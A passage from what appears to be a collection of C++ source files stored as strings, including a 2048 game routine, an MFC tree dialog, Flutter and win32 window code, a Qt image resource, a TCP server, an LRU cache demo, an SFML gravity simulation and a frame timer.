j; j_rewrite < cols-1; j_rewrite++) {\n        new_value = gamestate[i][j_rewrite+1];\n        gamestate[i][j_rewrite] = new_value;\n        if (new_value!=0) moved_non_zero_tile = true;\n    }\n    // insert a 0 at the end\n    gamestate[i][cols-1] = 0;\n    return moved_non_zero_tile;\n}\n\ninline bool shift_right(int i, int j, int rows, int cols, state_type& gamestate){\n    bool moved_non_zero_tile = false;\n    int8_t new_value;\n    for (int j_rewrite = j; j_rewrite > 0; j_rewrite--) {\n        new_value = gamestate[i][j_rewrite-1];\n        gamestate",
    "\ufeff//\n#include \"stdafx.h\"\n#include \"DependViewDlg.h\"\n\n#include \"baseConst.h\"\n#include \"baseConst.h\"\n#include \"clUtilityResource.h\"\n#include \"clUILibResource.h\"\n\n#include \"DependNode.h\"\n#include \"DependNodeList.h\"\n#include \"DataItem.h\"\n\nBEGIN_CUTLEADER_NAMESPACE()\n\nIMPLEMENT_DYNAMIC(DependViewDlg, CDialog)\n\nBEGIN_MESSAGE_MAP(DependViewDlg, CDialogEx)\n\tON_WM_CTLCOLOR()\n\n\tON_BN_CLICKED(IDC_BTN_CLOSE, OnClose)\n\nEND_MESSAGE_MAP()\n\nDependViewDlg::DependViewDlg(CWnd* pParent /*=NULL*/)\n\t: CLDialog(DependViewDlg::IDD, pParent)\n{\n\n}\n\nDependViewDlg::~DependViewDlg()\n{\n}\n\nvoid DependViewDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n\n\tDDX_Control(pDX, IDC_TREE_DEPEND, m_dependTree);\n\tDDX_Control (pDX, IDC_BTN_CLOSE, m_btnClose );\n}\n\nBOOL DependViewDlg::OnInitDialog()\n{\n\t__super::OnInitDialog();\n\n\t//\n\tInitDependTree();\n\n\tSetBackgroundColor( SkinManager::GetBackgroundColor() );\n\n\tSetWindowTheme( GetDlgItem( IDC_STATIC_DEPEND_TREE )->GetSafeHwnd(), L\"\", L\"\" );\n\n\tUpdateData(FALSE);\n\n\treturn TRUE;\n}\n\nHBRUSH DependViewDlg::OnCtlColor( CDC *pDC, CWnd *pWnd, UINT nCtlColor )\n{\n\treturn SkinManager::GetDialogCtrlColor( pDC, pWnd, nCtlColor );\n}\n\nvoid DependViewDlg::InitDependTree()\n{\n\t/************************************************************************/\n\t// load the images which will be used on the tree.\n\n\tCImageList* pImageList = new CImageList();\n\tpImageList->Create(IDB_DEPEND_TREE, 16, 10, RGB(192, 192, 192));\n\n\tm_dependTree.SetImageList(pImageList, TVSIL_NORMAL);\n\t/************************************************************************/\n\n\tfor (unsigned int i = 0; i < m_pDependNodeList->size(); i++)\n\t{\n\t\tDependNodePtr pDependNode = m_pDependNodeList->at(i);\n\t\tDependNodeListPtr pDependNodeList = pDependNode->GetDependNodeList();\n\n\t\t// if some DependNode has an empty \"DependNode::m_pDependNodeList\",\n\t\t// do not display it.\n\t\tif (pDependNodeList->size() == 0)\n\t\t\tcontinue;\n\n\t\t// build the string which will be displayed on the tree node.\n\t\tCString strNodeName;\n\t\tDataItemPtr pDataItem = pDependNode->GetDataItem();\n\t\tstrNodeName = pDataItem->GetName();\n\t\tstrNodeName += _T(\"(\");\n\t\tstrNodeName += pDataItem->GetItemPath();\n\t\tstrNodeName += _T(\")\");\n\n\n\t\t/************************************************************************/\n\t\t// create tree node.\n\n\t\tTVINSERTSTRUCT dependItem;\n\t\tdependItem.hParent = NULL;\n\t\tdependItem.item.pszText = strNodeName.AllocSysString();\n\t\tdependItem.item.cchTextMax = MAXLENGTH_STR;\n\t\tdependItem.hInsertAfter = TVI_LAST;\n\n\t\t// whether we should display \"+\" sign.\n\t\tif (pDependNodeList->size() > 0)\n\t\t{\n\t\t\tdependItem.item.mask = TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT|TVIF_CHILDREN;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tdependItem.item.mask = TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT;\n\t\t}\n\n\t\t// select the image.\n\t\tif (pDataItem->GetDataType() == DATANODE_PART)\n\t\t{\n\t\t\tdependItem.item.iImage = 4;\n\t\t\tdependItem.item.iSelectedImage = 4;\n\t\t}\n\t\telse if (pDataItem->GetDataType() == DATANODE_Task)\n\t\t{\n\t\t\tdependItem.item.iImage = 6;\n\t\t\tdependItem.item.iSelectedImage = 6;\n\t\t}\n\n\t\tHTREEITEM hRootItem = m_dependTree.InsertItem(&dependItem);\n\t\t/************************************************************************/\n\n\n\t\t// init the sub-node under this node.\n\t\tAppendSubNode(pDependNodeList, hRootItem);\n\n\t\t// expand all the root nodes.\n\t\tm_dependTree.Expand(hRootItem, TVE_EXPAND);\n\t}\n}\n\nvoid DependViewDlg::AppendSubNode(DependNodeListPtr pDependNodeList, HTREEITEM hParentNode)\n{\n\tfor (unsigned int i = 0; i < pDependNodeList->size(); i++)\n\t{\n\t\tDependNodePtr pDependNode = pDependNodeList->at(i);\n\t\tDataItemPtr pDataItem = pDependNode->GetDataItem();\n\t\tDependNodeListPtr pTmpDependNodeList = pDependNode->GetDependNodeList();\n\n\n\t\t/************************************************************************/\n\t\t// append \"pDependNode\" to \"hParentNode\".\n\n\t\t// build the string which will be displayed on the tree node.\n\t\tCString strNodeName;\n\t\tstrNodeName = pDataItem->GetName();\n\t\tstrNodeName += _T(\"(\");\n\t\tstrNodeName += pDataItem->GetItemPath();\n\t\tstrNodeName += _T(\")\");\n\n\t\t// create tree node.\n\t\tTVINSERTSTRUCT hItem;\n\t\thItem.hParent = hParentNode;\n\t\thItem.item.pszText = strNodeName.AllocSysString();\n\t\thItem.item.cchTextMax = MAXLENGTH_STR;\n\t\thItem.hInsertAfter = TVI_LAST;\n\n\t\t// whether show \"+\" sign.\n\t\tif (pTmpDependNodeList->size())\n\t\t{\n\t\t\thItem.item.mask = TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT|TVIF_CHILDREN;\n\t\t}\n\t\telse\n\t\t{\n\t\t\thItem.item.mask = TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT;\n\t\t}\n\n\t\t// decide the image.\n\t\tif (pDataItem->GetDataType() == DATANODE_PART)\n\t\t{\n\t\t\thItem.item.iImage = 4;\n\t\t\thItem.item.iSelectedImage = 4;\n\t\t}\n\t\telse if (pDataItem->GetDataType() == DATANODE_Task)\n\t\t{\n\t\t\thItem.item.iImage = 6;\n\t\t\thItem.item.iSelectedImage = 6;\n\t\t}\n\n\t\t//\n\t\tHTREEITEM hSubNode = m_dependTree.InsertItem(&hItem);\n\t\t/************************************************************************/\n\n\n\t\t// check whether we will init \"hSubNode\"\n\t\tif (pTmpDependNodeList->size())\n\t\t{\n\t\t\tAppendSubNode(pTmpDependNodeList, hSubNode);\n\t\t}\n\t}\n}\n\nvoid D",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
    "/****************************************************************************\n** Resource object code\n**\n** Created by: The Resource Compiler for Qt version 5.9.1\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\nstatic const unsigned char qt_resource_data[] = {\n  // C:/Users/haivi/OneDrive - 3ina/Document/QT/LCD_Timing_Calculate/background.png\n  0x0,0x1,0x16,0x85,\n  0x89,\n  0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,\n  0x0,0x1,0x19,0x0,0x0,0x0,0x83,0x8,0x2,0x0,0x0,0x0,0x36,0xf8,0xf8,0xd1,\n  0x0,0x0,0x0,0x9,0x70,0x48,0x59,0x73,0x0,0x0,0xb,0x13,0x0,0x0,0xb,0x13,\n  0x1,0x0,0x9a,0x9c,0x18,0x0,0x0,0x0,0x20,0x63,0x48,0x52,0x4d,0x0,0x0,0x7a,\n  0x25,0x0,0x0,0x80,0x83,0x0,0x0,0xf9,0xff,0x0,0x0,0x80,0xe9,0x0,0x0,0x75,\n  0x30,0x0,0x0,0xea,0x60,0x0,0x0,0x3a,0x98,0x0,0x0,0x17,0x6f,0x92,0x5f,0xc5,\n  0x46,0x0,0x1,0x16,0xb,0x49,0x44,0x41,0x54,0x78,0xda,0xec,0xfd,0x65,0xb8,0x24,\n  0xd7,0x79,0x2e,0xc,0x2f,0x2a,0x6c,0x86,0xcd,0x4c,0xc3,0xc,0xd2,0x8c,0x34,0x92,\n  0x46,0x2c,0x4b,0xb2,0x5,0x66,0x76,0xec,0x38,0x89,0x43,0x27,0x89,0xc3,0x39,0x81,\n  0x37,0xb6,0x43,0x3e,0x61,0x70,0xec,0x24,0xc6,0x18,0x62,0x92,0x2c,0xb6,0x24,0x8b,\n  0x46,0xa3,0x61,0x9e,0xbd,0x67,0x36,0xf3,0x6e,0xa6,0xe2,0xaa,0x45,0xdf,0x8f,0x91,\n  0x1d,0xe5,0x84,0x1c,0x87,0xbe,0x13,0x6b,0x5d,0xf5,0x63,0x5f,0xdd,0xd5,0xbd,0xbb,\n  0xaa,0xd6,0xbd,0x9e,0xfb,0xb9,0x1f,0x58,0x50,0x8,0x6,0x5e,0x1d,0xff,0xec,0x40,\n  0xff,0xe2,0xbb,0x12,0x0,0xf9,0x8f,0x5e,0x84,0x0,0xc0,0x7f,0xea,0x64,0x78,0xe5,\n  0x64,0x8,0xe1,0x77,0xf9,0xbf,0xa5,0xe4,0x52,0xca,0x7f,0xe6,0x7c,0x9,0x21,0x7a,\n  0xe5,0xcf,0xb,0xc2,0x6a,0xa1,0x79,0xdc,0xa1,0xde,0x5a,0xed,0xf2,0x62,0xe3,0xc4,\n  0x5a,0xc0,0x25,0x40,0x58,0xf8,0xad,0xd0,0x9f,0x29,0xcc,0xbd,0x7e,0xcf,0x2f,0xbd,\n  0x79,0xef,0x8f,0x5e,0x58,0x3d,0xe3,0x43,0xb9,0x36,0x7f,0x46,0x8d,0xe7,0x2c,0xd9,\n  0x74,0x5a,0xb,0x1a,0xa6,0x12,0xc3,0x80,0x86,0xa1,0xd7,0xea,0x6b,0x5b,0x3f,0xd4,\n  0x9d,0x9b,0x9a,0xf9,0x2,0x80,0x99,0xb7,0x5e,0xf3,0x49,0x8c,0x93,0x0,0x0,0x29,\n  0xe5,0x77,0x71,0xc9,0xaf,0xe,0x0,0x0,0x20,0xff,0xe8,0x79,0x7f,0x9f,0xf,0xf9,\n  0x6f,0x7c,0xb,0x7e,0x17,0x1f,0xbc,0x32,0x4,0x0,0x0,0xc0,0x2b,0x88,0x7a,0xc5,\n  0x7d,0xe6,0x0,0x0,0xea,0x46,0xab,0x96,0x5f,0x61,0x9c,0x40,0x90,0x89,0x9b,0xf9,\n  0x74,0x2c,0xe,0x0,0x80,0x10,0x1,0x20,0x20,0x90,0x0,0x40,0xf9,0x7f,0x3f,0x1a,\n  0xf9,0xca,0x6f,0x39,0xb5,0xf8,0xc0,0x33,0x17,0xfe,0xcc,0xc1,0x4b,0x48,0x31,0x69,\n  0xa8,0x10,0x9c,0x77,0x25,0xb,0xa9,0x45,0x24,0x6f,0x85,0xb2,0xee,0x84,0x4,0xe9,\n  0xc,0x70,0x9b,0xd6,0x97,0xac,0x5,0x3d,0x8b,0x97,0xb,0x97,0xeb,0xc1,0x6c,0xe4,\n  0xdb,0x49,0x3d,0x52,0x74,0x58,0xf,0x3c,0x21,0xd5,0xc2,0xfc,0x5c,0xb9,0xb9,0x61,\n  0xa0,0x73,0xcf,0xa5,0xd2,0x3,0x8f,0x9c,0xfa,0xf0,0xeb,0xae,0xfa,0x2d,0x8,0x8,\n  0x84,0x52,0x2,0xf8,0xf,0x2f,0xe,0xfe,0x5b,0x6e,0xda,0xf7,0x23,0x96,0xfe,0xef,\n  0x75,0xee,0xfb,0x19,0x4e,0x52,0xf2,0x7f,0x34,0x63,0xfe,0x55,0x13,0x24,0xff,0x35,\n  0x20,0x49,0x8,0x31,0x90,0x57,0xe0,0x4,0xca,0x8d,0xd3,0x93,0xe5,0xa7,0x22,0xdc,\n  0xc7,0x65,0xb2,0x56,0x3b,0x52,0xb6,0x8e,0x37,0xc5,0x8a,0x43,0x93,0x29,0x75,0xef,\n  0x86,0xae,0x3d,0xeb,0xb3,0x3b,0xd7,0x77,0x6c,0x52,0x15,0x5,0x42,0x24,0x81,0xb8,\n  0x62,0xcf,0xfe,0xe1,0xcf,0xc1,0xdf,0x7e,0x81,0x7e,0xee,0x85,0x5f,0x3a,0xbe,0xf2,\n  0xd,0x33,0x9e,0xd0,0xf0,0x40,0x14,0x31,0x84,0x54,0x37,0x12,0x76,0x58,0xc7,0x18,\n  0x33,0xa8,0x56,0x6b,0xb5,0xd0,0x85,0x10,0xb3,0xc5,0xe6,0xdc,0xf8,0xea,0x8b,0xc5,\n  0xe6,0x65,0x0,0xc,0xc9,0x1a,0x4,0x6b,0xc,0xf2,0x0,0x0,0xea,0x3b,0x6,0x90,\n  0x5c,0x63,0x1,0x8b,0x56,0x5a,0x67,0x90,0x32,0xd2,0x93,0x7d,0xd3,0x5a,0x73,0xe6,\n  0xf0,0x85,0xcf,0x1e,0xd8,0xfa,0x5e,0x0,0xa0,0x4,0x2,0xfe,0xfd,0xc4,0x80,0xff,\n  0xf6,0x35,0xe8,0xfb,0xd4,0x2e,0xbd,0x3a,0xfe,0x33,0xc6,0x15,0x9a,0x86,0x81,0x84,\n  0x57,0xa6,0xe2,0xe1,0xcb,0xbf,0x3b,0x51,0xf9,0x3b,0x1f,0x50,0xca,0x47,0x15,0x6d,\n  0x57,0xa5,0x76,0x6,0x30,0x57,0x92,0x14,0x14,0x6a,0x88,0xa,0x13,0xe5,0xa7,0xd7,\n  0x4a,0xb,0x56,0xe8,0x5c,0x3b,0x72,0x2d,0x0,0x50,0x2,0x2c,0xa1,0xb8,0x2,0x9d,\n  0xef,0x30,0x2e,0x88,0x5e,0x9e,0xd3,0xc7,0x16,0xfe,0xfa,0x78,0xf5,0x73,0x46,0x62,\n  0x8b,0x42,0x74,0x5f,0x44,0x9c,0x42,0x9d,0x8,0x29,0x3,0x2c,0xa1,0x64,0x6a,0x10,\n  0x45,0x0,0x0,0x2,0x35,0x27,0x72,0xce,0xae,0x3c,0x75,0x6e,0xf1,0xb9,0x8e,0x54,\n  0xbb,0x46,0xb4,0xaa,0x17,0x2a,0x38,0x4c,0xc7,0x62,0x82,0xcb,0x28,0x82,0x1c,0x46,\n  0x92,0x30,0xc9,0x7d,0x45,0x37,0x56,0x9d,0x95,0x42,0xb3,0xbc,0xae,0x63,0x64,0x62,\n  0xed,0x99,0xf5,0x83,0xd7,0xb5,0x25,0xc6,0x10,0x80,0x0,0x2,0xf9,0x2a,0x58,0xfe,\n  0x7d,0xfe,0xc0,0xab,0xe3,0x7b,0x4,0xcf,0x95,0xf5,0x5b,0xbe,0x12,0x48,0x0,0x2,\n  0x8,0xc2,0xa0,0xf5,0xd8,0xe9,0x9f,0x3b,0xb7,0xf6,0x25,0x40,0x62,0x3a,0xea,0xc5,\n  0x40,0xda,0xee,0x2a,0x22,0x79,0xe,0x33,0x61,0x90,0xe0,0x54,0xb5,0x2d,0x67,0xa9,\n  0xb0,0xe8,0x82,0x95,0x13,0xb3,0x8f,0x9d,0x5a,0x38,0xa,0x0,0x40,0x12,0x20,0x80,\n  0xfe,0x49,0xc3,0xe8,0x46,0x33,0xcf,0x4f,0x7c,0xdd,0x8c,0xf,0x1b,0x26,0x62,0x91,\n  0x47,0x10,0x67,0x8c,0x5,0x11,0xc7,0x58,0xa4,0x62,0xa6,0x60,0x2c,0xa4,0xae,0xaa,\n  0xb3,0xae,0x8e",
    "#include \"ReTCPServer.h\"\n\nReTCPServer::ReTCPServer(std::string name, std::string filtertype, std::string filtervalue, \n   int port, ReOutputFormat fmt, bool enabled) : ReServer(name, \"tcp\", filtertype, filtervalue, port, fmt, enabled)\n{\n   m_server = new AsyncServer(port);\n}\n\nvoid ReTCPServer::start()\n{\n   m_server->onClient(std::bind(&ReTCPServer::handleNewClient, this, std::placeholders::_1, std::placeholders::_2), m_server);\n   m_server->begin();\n\n   logger.debug(RE_TAG, \"Start %s\", m_name.c_str());\n}\n\nvoid ReTCPServer::sendData(char* outMsgBuf, size_t& size)\n{\n   for (auto client : m_clients)\n   {\n      // reply to client\n      if (client->space() >= size + 10 && client->canSend())\n      {\n         client->write(outMsgBuf, size);\n\n         // Data can be sent to multiple clients so count bytesSent total value\n         m_stats.bytesSent += size;\n      }\n   }\n}\n\n/* server events */\nvoid ReTCPServer::handleNewClient(void* arg, AsyncClient* client)\n{\n   logger.debug(RE_TAG, \"%s add client (%p) ip: %s\", m_name.c_str(), client, client->remoteIP().toString().c_str());\n\n   // add to list\n   m_clients.push_back(client);\n   logger.debug(RE_TAG, \"%s num clients %d\", m_name.c_str(), m_clients.size());\n\n   m_client_connected = (m_clients.size()) > 0 ? true : false;\n\n   // register events\n   client->onData(std::bind(&ReTCPServer::handleData, this, std::placeholders::_1,\n      std::placeholders::_2, std::placeholders::_3, std::placeholders::_4), NULL);\n   client->onError(std::bind(&ReTCPServer::handleError, this, std::placeholders::_1,\n      std::placeholders::_2, std::placeholders::_3), NULL);\n   client->onTimeout(std::bind(&ReTCPServer::handleTimeOut, this, std::placeholders::_1,\n      std::placeholders::_2, std::placeholders::_3), NULL);\n   client->onDisconnect(std::bind(&ReTCPServer::handleDisconnect, this, std::placeholders::_1,\n      std::placeholders::_2), NULL);\n\n   std::string info = m_name + \" \" + m_type + \" on port \" + std::to_string(m_port) + \"\\r\\n\";\n   // reply to client\n   if (client->space() > info.length() && client->canSend())\n   {\n      client->write(info.c_str(), info.length());\n   }\n}\n\n/* clients events */\nvoid ReTCPServer::handleError(void* arg, AsyncClient* client, int8_t error)\n{\n   logger.debug(RE_TAG, \"%s, connection error %s from client %s\", m_name.c_str(), client->errorToString(error),\n      client->remoteIP().toString().c_str());\n}\n\nvoid ReTCPServer::handleData(void* arg, AsyncClient* client, void* data, size_t len)\n{\n   logger.debug(RE_TAG, \"%s, data received from client %s\", m_name.c_str(), client->remoteIP().toString().c_str());\n}\nvoid ReTCPServer::handleDisconnect(void* arg, AsyncClient* client)\n{\n   logger.debug(RE_TAG, \"%s client (%p) disconnected\", m_name.c_str(), client);\n   m_clients.erase(std::find(m_clients.begin(), m_clients.end(), client));\n\n   m_client_connected = (m_clients.size()) > 0 ? true : false;\n}\n\nvoid ReTCPServer::handleTimeOut(void* arg, AsyncClient* client, uint32_t time)\n{\n   logger.debug(RE_TAG, \"%s, client ACK timeout ip: %s\", m_name.c_str(), client->remoteIP().toString().c_str());\n}\n",
    "#include <iostream>\r\n#include <unordered_map>\r\n#include <list>\r\n#include <string>\r\n\r\nclass LRUCache {\r\nprivate:\r\n    int capacity;\r\n    std::list<std::pair<int, std::string>> cache; // Doubly linked list to store (orderID, orderDetails)\r\n    std::unordered_map<int, std::list<std::pair<int, std::string>>::iterator> map; // HashMap to store orderID and its position in the list\r\n\r\npublic:\r\n    LRUCache(int cap) : capacity(cap) {}\r\n\r\n    // Access an order by its orderID\r\n    std::string get(int orderID) {\r\n        if (map.find(orderID) == map.end()) {\r\n            return \"Order not found\"; // Return if orderID is not in the cache\r\n        }\r\n        // Move the accessed order to the front (most recent)\r\n        cache.splice(cache.begin(), cache, map[orderID]);\r\n        return map[orderID]->second; // Return the order details\r\n    }\r\n\r\n    // Add or update an order in the cache\r\n    void put(int orderID, const std::string& orderDetails) {\r\n        if (map.find(orderID) != map.end()) {\r\n            // If the order is already in cache, update it and move to front\r\n            cache.splice(cache.begin(), cache, map[orderID]);\r\n            map[orderID]->second = orderDetails;\r\n        } else {\r\n            // If the cache is full, remove the least recently used order\r\n            if (cache.size() == capacity) {\r\n                // Remove the least recently used order (back of the list)\r\n                int oldOrderID = cache.back().first;\r\n                map.erase(oldOrderID);\r\n                cache.pop_back();\r\n            }\r\n            // Insert the new order at the front\r\n            cache.push_front({orderID, orderDetails});\r\n            map[orderID] = cache.begin();\r\n        }\r\n    }\r\n\r\n    // Display the cache (for testing purposes)\r\n    void displayCache() {\r\n        for (const auto& pair : cache) {\r\n            std::cout << \"Order ID: \" << pair.first << \", Details: \" << pair.second << std::endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    // Create an LRU cache with capacity 3 for restaurant orders\r\n    LRUCache orderCache(3);\r\n\r\n    // Add some orders to the cache\r\n    orderCache.put(101, \"Burger, Fries, Soda - $12.50\");\r\n    orderCache.put(102, \"Pasta, Salad, Wine - $18.00\");\r\n    orderCache.put(103, \"Pizza, Garlic Bread - $14.30\");\r\n\r\n    // Display the cache\r\n    std::cout << \"Current cache:\" << std::endl;\r\n    orderCache.displayCache();\r\n\r\n    // Access an order (this will move it to the front)\r\n    std::cout << \"\\nAccessing Order 101: \" << orderCache.get(101) << std::endl;\r\n\r\n    // Add another order, which will evict the least recently used one (Order 102)\r\n    orderCache.put(104, \"Steak, Mashed Potatoes - $22.00\");\r\n\r\n    // Display the updated cache\r\n    std::cout << \"\\nUpdated cache after adding Order 104:\" << std::endl;\r\n    orderCache.displayCache();\r\n\r\n    // Access another order\r\n    std::cout << \"\\nAccessing Order 103: \" << orderCache.get(103) << std::endl;\r\n\r\n    // Add another order, which will evict the least recently used one (Order 103)\r\n    orderCache.put(105, \"Chicken Tacos, Guacamole - $16.00\");\r\n\r\n    // Final cache display\r\n    std::cout << \"\\nFinal cache after adding Order 105:\" << std::endl;\r\n    orderCache.displayCache();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <SFML/Graphics.hpp>\n#include <complex>\n\n#define WINDOW_WIDTH 800\n#define WINDOW_HEIGHT 600\n#define N_BODIES 15\n#define TRAIL_SIZE 50\n#define BODY_SIZE 10.0\n#define G 10000.0\n\nclass Body\n{\nprivate:\n    float mass_ = 50.0;\n    float state_[6];\n    std::complex<float> vel_ = {static_cast<float>(rand() % 100), static_cast<float>(rand() % 100)};\n    sf::CircleShape shape_;\n    sf::Time dt_ = sf::milliseconds(16/10);\n    sf::RenderWindow &window_;\n    std::vector<sf::CircleShape> trail_;\n\npublic:\n    float loc[2];\n\n    Body(sf::RenderWindow &window) : window_(window), trail_(TRAIL_SIZE)\n    {\n        loc[0] = static_cast<float>(rand() % WINDOW_WIDTH);\n        loc[1] = static_cast<float>(rand() % WINDOW_HEIGHT);\n\n        shape_ = sf::CircleShape(BODY_SIZE);\n        shape_.setFillColor(sf::Color::Magenta);\n    };\n\n    ~Body() {};\n\n    void update(std::vector<Body> bodies)\n    {\n        sf::sleep(dt_);\n        float dt = dt_.asSeconds();\n\n        std::complex<float> acc = getGravityPullAcc(bodies);\n        vel_ += acc * dt;\n\n        trail_.erase(trail_.begin());\n        trail_.push_back(shape_);\n        trail_.back().setPosition(loc[0], loc[1]);\n        \n        loc[0] += vel_.real() * dt;\n        loc[1] += vel_.imag() * dt;\n        this->shape_.setPosition(loc[0], loc[1]);\n    };\n\n    std::complex<float> getGravityPullAcc(std::vector<Body> bodies)\n    {\n        std::complex<float> total_acc = {0.0, 0.0};\n        for (const auto &body : bodies)\n        {\n            float dx = body.loc[0] - loc[0];\n            float dy = body.loc[1] - loc[1];\n            float distance = std::sqrt(dx * dx + dy * dy);\n            if (distance > 0)\n            {\n                float force = static_cast<float>(G * mass_ * body.mass_ / (distance * distance));\n                total_acc += std::complex<float>(force * dx / distance, force * dy / distance);\n            }\n        }\n        return total_acc;\n    };\n\n    void drawTrail(sf::RenderWindow &window){\n        for (int i = 0; i < TRAIL_SIZE; ++i)\n        {\n            trail_[i].setFillColor(sf::Color::Color(255,0,0,255 - 255 * (TRAIL_SIZE-i) / TRAIL_SIZE));\n            trail_[i].setRadius(float(BODY_SIZE * i / TRAIL_SIZE));\n            window.draw(trail_[i]);\n        }  \n    };\n\n    void render()\n    {\n        this->drawTrail(this->window_);\n        this->window_.draw(this->shape_);\n    };\n};\n\nvoid updateUniverse(sf::RenderWindow &window, std::vector<Body> &bodies)\n{\n    for (auto &body : bodies)\n    {\n        body.update(bodies);\n        body.render();\n    }\n};\n\nint main()\n{\n    // Create the main window\n    sf::RenderWindow window(sf::VideoMode(WINDOW_WIDTH, WINDOW_HEIGHT), \"SFML window\");\n\n    std::vector<Body> bodies;\n    for (int i = 0; i < N_BODIES; ++i)\n    {\n        bodies.emplace_back(window);\n    }\n\n    // Start the game loop\n    while (window.isOpen())\n    {\n        // Process events\n        sf::Event event;\n\n        while (window.pollEvent(event))\n        {\n            // Close window: exit\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        // Clear screen\n        window.clear();\n\n        updateUniverse(window, bodies);\n\n        // Update the window\n        window.display();\n    }\n\n    return 0;\n}",
    "#pragma once\n#include \"PreCompiledHeader.h\"\n#include \"TimeManager.h\"\nTimeManager::TimeManager()\n\t:mFrequency({0}), mTime({0}), mCurrentTime(0), mPreviousTime(0), mDeltaTime(0.0f)\n\t, mTargetFrameRate(60.0f), mTargetOneFrameTime(0), mIsLimitFrame(false)\n{\n\n}\n\nTimeManager::~TimeManager()\n{\n\n}\n\nvoid TimeManager::Initialize()\n{\n\tQueryPerformanceFrequency(&mFrequency);\n\tQueryPerformanceCounter(&mTime);\n\tmCurrentTime = mTime.QuadPart;\n}\n\nvoid TimeManager::Update()\n{\n\t// \ud604\uc7ac \ud504\ub808\uc784 \uc2dc\uac04 \uc800\uc7a5\n\tQueryPerformanceCounter(&mTime);\n\tmCurrentTime = mTime.QuadPart;\n\n\t// \ud504\ub808\uc784 \uc2dc\uac04 \uacc4\uc0b0\n\tmDeltaTime = static_cast<float>(mCurrentTime - mPreviousTime) / static_cast<float>(mFrequency.QuadPart);\n}\n\nfloat TimeManager::GetDeltaTime()\n{\n\treturn mDeltaTime;\n}\n\nvoid TimeManager::SaveCurrentTime()\n{\n\tmPreviousTime = mCurrentTime;\n}\n\nvoid TimeManager::LimitFrame(float _limit)\n{\n\tassert(_limit >= 30 && _limit <= 240 && \"Frame limit must be between 30 and 240.\");\n\n\tmTargetFrameRate = _limit;\n\tmIsLimitFrame = true;\n\tmTargetOneFrameTime = 1.0f / mTargetFrameRate;\n}\n\nbool TimeManager::IsLimitFrame()\n{\n\treturn mIsLimitFrame;\n}\n\nbool TimeManager::CheckOverTargetFrame()\n{\n\treturn mDeltaTime >= mTargetOneFrameTime;\n}\n\n\n",
    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * 